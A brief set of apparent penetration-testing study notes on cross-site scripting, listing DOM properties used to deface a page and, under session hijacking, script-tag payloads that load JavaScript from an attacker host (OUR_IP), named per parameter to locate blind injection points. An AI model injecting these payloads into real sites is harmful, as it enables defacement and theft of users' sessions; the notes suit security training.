# Defacing
## Defacement Elements

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

# Session Hijacking
## Loading a Remote Script

```html
<script src="http://OUR_IP/script.js"></script>
```

We can also change the name of the script name from `script.js` to be the name of the parameter so we can identify which parameter is vulnerable

```html
<script src="http://OUR_IP/username"></script>
```

